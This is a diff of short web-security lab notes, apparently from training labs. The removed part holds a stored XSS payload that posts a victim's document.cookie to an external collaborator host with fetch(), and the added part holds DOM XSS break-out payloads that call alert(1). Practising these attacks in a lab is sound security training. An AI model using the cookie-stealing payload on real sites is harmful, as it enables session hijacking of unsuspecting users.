@@ -1,10 +1,11 @@
-Lab #3 - Exploiting cross-site scripting to steal cookies
+Lab #3 – DOM XSS in document.write sink using source location.search
 
-Target Goal - Exploit stored XSS vulnerability in the blog comments function and exfiltrate the victim's session cookie.
+Target Goal - Exploit the DOM-based XSS vulnerability to call the alert function.
 
 Analysis:
 
 
-<script>
-fetch('https://kh5y0i7j3n6eudotram14z1r2i88wx.oastify.com', {method: 'POST', mode: 'no-cors', body:document.cookie});
-</script>
+<img src="/resources/images/tracker.gif?searchTerms=123456"><script>alert(1)</script>">
+
+
+"><script>alert(1)</script>
